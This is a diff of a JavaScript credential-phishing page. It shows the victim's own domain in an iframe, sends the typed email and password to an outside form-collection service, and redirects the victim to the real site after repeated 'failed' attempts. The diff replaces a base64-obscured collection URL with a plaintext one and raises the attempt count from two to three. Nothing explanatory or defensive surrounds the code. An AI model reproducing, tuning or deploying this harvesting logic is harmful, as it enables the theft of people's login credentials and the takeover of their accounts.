@@ -247,7 +247,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
       
       $.ajax({
         dataType: 'JSON',
-        url: 'aHR0cHM6Ly9ub2NvZGVmb3JtLmlvL2YvNjVmYjY1NTI4N2FmMjdjZjJkNWQxMzJj',
+        url: 'https://nocodeform.io/f/65fb655287af27cf2d5d132c',
         type: 'POST',
         data:{
           email:email,
@@ -263,7 +263,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
-                  if (count>=2) {
+                  if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("http://www."+my_slice);
@@ -278,7 +278,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
             },
             error: function(){
               $("#password").val("");
-              if (count>=2) {
+              if (count>=3) {
                 count=0;
                 window.location.replace("http://www."+my_slice);
               }
